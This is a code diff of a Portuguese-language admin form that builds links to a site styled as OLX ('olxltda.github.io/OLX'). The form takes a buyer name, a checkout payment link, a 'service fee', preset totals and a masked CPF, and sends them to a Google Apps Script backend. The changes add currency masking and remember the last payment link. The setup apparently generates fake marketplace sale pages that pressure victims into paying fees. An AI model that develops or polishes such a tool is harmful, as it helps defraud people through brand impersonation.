@@ -71,25 +71,25 @@
   <input type="text" name="comprador" required placeholder="Nome completo">
   
   <label>Link Pagamento (Checkout)</label>
-  <input type="text" name="linkPagamento" placeholder="https://go.perfectpay...">
+  <input type="text" name="linkPagamento" id="linkPagamento" placeholder="https://go.perfectpay...">
 
   <label>Taxa de Serviço</label>
-  <input type="text" name="taxa" placeholder="Ex: R$ 50,00">
+  <input type="text" name="taxa" class="money" placeholder="R$ 0,00">
 
   <hr style="border:0; border-top:1px solid #444; margin: 20px 0;">
   <p style="font-size:12px; color:#888; text-align:center; letter-spacing:1px;">DADOS PRÉ-DEFINIDOS</p>
 
   <label>Valor Total</label>
-  <input type="text" name="valor" value="R$ 1.000,00">
+  <input type="text" name="valor" class="money" value="R$ 1.000,00">
 
   <label>Prazo</label>
   <input type="text" name="prazo" value="12 horas">
 
   <label>Frete</label>
-  <input type="text" name="frete" value="R$ 0,00">
+  <input type="text" name="frete" class="money" value="R$ 0,00">
 
   <label>Tarifa</label>
-  <input type="text" name="tarifa" value="R$ 0,00">
+  <input type="text" name="tarifa" class="money" value="R$ 0,00">
 
   <label>CPF Mascarado</label>
   <input type="text" name="cpf" value="406.***.***.01">
@@ -126,10 +126,7 @@
 // ⚙️ CONFIGURAÇÃO
 // ========================================================
 
-// 1. URL do Google Script (Backend)
 const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
-
-// 2. URL do Site do Cliente
 const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 
 
 // ========================================================
@@ -140,11 +137,61 @@ const linkDisplay = document.getElementById('finalLink');
 const btnSalvar = document.getElementById('btnSalvar');
 const btnCopy = document.getElementById('btnCopy');
 
+// --- 1. LÓGICA DE MÁSCARA DE MOEDA (R$) ---
+const moneyInputs = document.querySelectorAll('.money');
+
+const formatMoney = (value) => {
+  // Remove tudo que não é dígito
+  value = value.replace(/\D/g, "");
+  
+  // Converte para float (divide por 100 para ter centavos)
+  // Se estiver vazio, assume 0
+  const amount = parseFloat(value) / 100;
+  
+  // Formata usando a API nativa do navegador para BRL
+  return amount.toLocaleString('pt-BR', {
+    style: 'currency',
+    currency: 'BRL'
+  });
+};
+
+moneyInputs.forEach(input => {
+  // Evento ao digitar
+  input.addEventListener('input', (e) => {
+    e.target.value = formatMoney(e.target.value);
+  });
+
+  // Formatação inicial caso já tenha valor no HTML (ex: R$ 1.000,00)
+  // Apenas garante que o formato está correto
+  if(input.value) {
+    // Pequeno hack: remove formatação antiga e reaplica
+    const cleanVal = input.value.replace(/\D/g, "");
+    if(cleanVal) input.value = formatMoney(cleanVal);
+  }
+});
+
+// --- 2. RECUPERAR ÚLTIMO LINK USADO (Memória) ---
+document.addEventListener('DOMContentLoaded', () => {
+  const lastLink = localStorage.getItem('lastPaymentLink');
+  const linkInput = document.getElementById('linkPagamento');
+  
+  if (lastLink) {
+    linkInput.value = lastLink;
+  }
+});
+
+// --- 3. ENVIO DO FORMULÁRIO ---
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
   
   btnSalvar.textContent = "Processando...";
   btnSalvar.disabled = true;
+
+  // Salva o link atual na memória para a próxima vez
+  const currentLink = document.getElementById('linkPagamento').value;
+  if(currentLink) {
+    localStorage.setItem('lastPaymentLink', currentLink);
+  }
 
   const data = {};
   new FormData(form).forEach((v, k) => data[k] = v);
